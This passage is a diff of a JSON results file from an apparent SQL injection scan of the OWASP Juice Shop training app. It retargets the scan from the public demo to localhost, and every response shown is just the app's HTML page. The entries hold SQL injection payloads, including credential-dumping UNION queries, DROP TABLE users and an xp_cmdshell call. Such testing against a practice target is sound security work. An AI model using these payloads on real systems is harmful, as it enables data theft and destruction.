@@ -1,224 +1,224 @@
 [
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' OR '1'='1",
+        "url": "http://localhost:3000/#//api/search?q=' OR '1'='1",
         "payload": "' OR '1'='1",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' OR '1'='1' --",
+        "url": "http://localhost:3000/#//api/search?q=' OR '1'='1' --",
         "payload": "' OR '1'='1' --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' OR 1=1 --",
+        "url": "http://localhost:3000/#//api/search?q=' OR 1=1 --",
         "payload": "' OR 1=1 --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=admin' --",
+        "url": "http://localhost:3000/#//api/search?q=admin' --",
         "payload": "admin' --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' UNION SELECT NULL --",
+        "url": "http://localhost:3000/#//api/search?q=' UNION SELECT NULL --",
         "payload": "' UNION SELECT NULL --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' AND 1=0 UNION SELECT username, password FROM users --",
+        "url": "http://localhost:3000/#//api/search?q=' AND 1=0 UNION SELECT username, password FROM users --",
         "payload": "' AND 1=0 UNION SELECT username, password FROM users --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' OR 1=1 LIMIT 1 --",
+        "url": "http://localhost:3000/#//api/search?q=' OR 1=1 LIMIT 1 --",
         "payload": "' OR 1=1 LIMIT 1 --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' OR 1=1; --",
+        "url": "http://localhost:3000/#//api/search?q=' OR 1=1; --",
         "payload": "' OR 1=1; --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' OR 1=1; --+",
+        "url": "http://localhost:3000/#//api/search?q=' OR 1=1; --+",
         "payload": "' OR 1=1; --+",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' OR EXISTS(SELECT * FROM users) --",
+        "url": "http://localhost:3000/#//api/search?q=' OR EXISTS(SELECT * FROM users) --",
         "payload": "' OR EXISTS(SELECT * FROM users) --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' AND 1=1 --",
+        "url": "http://localhost:3000/#//api/search?q=' AND 1=1 --",
         "payload": "' AND 1=1 --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' AND 1=1 LIMIT 1 --",
+        "url": "http://localhost:3000/#//api/search?q=' AND 1=1 LIMIT 1 --",
         "payload": "' AND 1=1 LIMIT 1 --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' AND 1=1; DROP TABLE users --",
+        "url": "http://localhost:3000/#//api/search?q=' AND 1=1; DROP TABLE users --",
         "payload": "' AND 1=1; DROP TABLE users --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' AND 1=1; SELECT * FROM information_schema.tables --",
+        "url": "http://localhost:3000/#//api/search?q=' AND 1=1; SELECT * FROM information_schema.tables --",
         "payload": "' AND 1=1; SELECT * FROM information_schema.tables --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' AND 1=1; SELECT * FROM mysql.user --",
+        "url": "http://localhost:3000/#//api/search?q=' AND 1=1; SELECT * FROM mysql.user --",
         "payload": "' AND 1=1; SELECT * FROM mysql.user --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' AND 1=1; SHOW TABLES --",
+        "url": "http://localhost:3000/#//api/search?q=' AND 1=1; SHOW TABLES --",
         "payload": "' AND 1=1; SHOW TABLES --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q='; DROP TABLE users --",
+        "url": "http://localhost:3000/#//api/search?q='; DROP TABLE users --",
         "payload": "'; DROP TABLE users --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q='; SELECT * FROM users --",
+        "url": "http://localhost:3000/#//api/search?q='; SELECT * FROM users --",
         "payload": "'; SELECT * FROM users --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' OR 1=1 --+",
+        "url": "http://localhost:3000/#//api/search?q=' OR 1=1 --+",
         "payload": "' OR 1=1 --+",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' OR 'a'='a' --",
+        "url": "http://localhost:3000/#//api/search?q=' OR 'a'='a' --",
         "payload": "' OR 'a'='a' --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' AND 1=1; SELECT username, password FROM users --",
+        "url": "http://localhost:3000/#//api/search?q=' AND 1=1; SELECT username, password FROM users --",
         "payload": "' AND 1=1; SELECT username, password FROM users --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q='; SELECT database() --",
+        "url": "http://localhost:3000/#//api/search?q='; SELECT database() --",
         "payload": "'; SELECT database() --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q='; SELECT user() --",
+        "url": "http://localhost:3000/#//api/search?q='; SELECT user() --",
         "payload": "'; SELECT user() --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' AND 1=1; EXEC xp_cmdshell('dir') --",
+        "url": "http://localhost:3000/#//api/search?q=' AND 1=1; EXEC xp_cmdshell('dir') --",
         "payload": "' AND 1=1; EXEC xp_cmdshell('dir') --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' UNION SELECT 1,2,3,4,5,6 --",
+        "url": "http://localhost:3000/#//api/search?q=' UNION SELECT 1,2,3,4,5,6 --",
         "payload": "' UNION SELECT 1,2,3,4,5,6 --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' UNION SELECT username, password FROM users --",
+        "url": "http://localhost:3000/#//api/search?q=' UNION SELECT username, password FROM users --",
         "payload": "' UNION SELECT username, password FROM users --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' UNION SELECT table_name FROM information_schema.tables --",
+        "url": "http://localhost:3000/#//api/search?q=' UNION SELECT table_name FROM information_schema.tables --",
         "payload": "' UNION SELECT table_name FROM information_schema.tables --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",
+        "url": "http://localhost:3000/#//api/search?q=' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",
         "payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' OR '1'='1'/*",
+        "url": "http://localhost:3000/#//api/search?q=' OR '1'='1'/*",
         "payload": "' OR '1'='1'/*",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' AND 1=1 --",
+        "url": "http://localhost:3000/#//api/search?q=' AND 1=1 --",
         "payload": "' AND 1=1 --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' OR 1=1; --",
+        "url": "http://localhost:3000/#//api/search?q=' OR 1=1; --",
         "payload": "' OR 1=1; --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
     },
     {
         "type": "SQL Injection",
-        "url": "https://demo.owasp-juice.shop/#//api/search?q=' OR 1=1; SELECT * FROM users --",
+        "url": "http://localhost:3000/#//api/search?q=' OR 1=1; SELECT * FROM users --",
         "payload": "' OR 1=1; SELECT * FROM users --",
         "response_status": 200,
         "response_text": "<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  --><!DOCTYPE html><html lang=\"en\"><head>\n  <meta charset=\"utf-8\">\n  <title>OWA"
